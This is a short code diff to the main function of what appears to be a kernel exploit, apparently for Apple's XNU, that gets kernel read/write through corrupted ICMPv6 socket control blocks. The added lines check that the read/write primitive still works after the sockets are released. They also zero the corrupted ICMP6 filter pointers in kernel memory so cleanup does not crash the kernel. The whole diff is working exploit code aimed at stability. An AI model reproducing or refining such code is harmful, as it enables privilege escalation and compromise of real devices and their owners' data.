@@ -916,6 +916,14 @@ int main(int argc, char* argv[])
 	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
 	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
 
+	// verify KRW is still intact after sockets_release
+	uint8_t krw_check[EARLY_KRW_LENGTH];
+	socklen_t krw_check_len = EARLY_KRW_LENGTH;
+	int kr_chk = getsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, krw_check, &krw_check_len);
+	uint64_t filter_val = *(uint64_t *)krw_check;
+	printf("[i] KRW check: getsockopt=%d filter_reads=%#llx (expect rwPcb+0x148 area data)\n",
+		kr_chk, filter_val); fflush(stdout);
+
 	krw_sockets_leak_forever();
 	printf("[+] sockets leaked\n"); fflush(stdout);
 
@@ -1001,6 +1009,14 @@ int main(int argc, char* argv[])
 		fflush(stdout);
 		closedir(dir);
 	}
+
+	// NULL the corrupted filter pointers so kfree_type in rip6_detach skips the free.
+	// may fail with EINVAL if sockets_release already detached the PCB — that's fine.
+	set_target_kaddr(controlSocketPcb + OFFSET_ICMP6FILT);
+	uint8_t zero_buf[EARLY_KRW_LENGTH] = {0};
+	setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, zero_buf, EARLY_KRW_LENGTH);
+	set_target_kaddr(rwSocketPcb + OFFSET_ICMP6FILT);
+	setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, zero_buf, EARLY_KRW_LENGTH);
 
 	printf("[*] DONE\n"); fflush(stdout);
 	return 0;
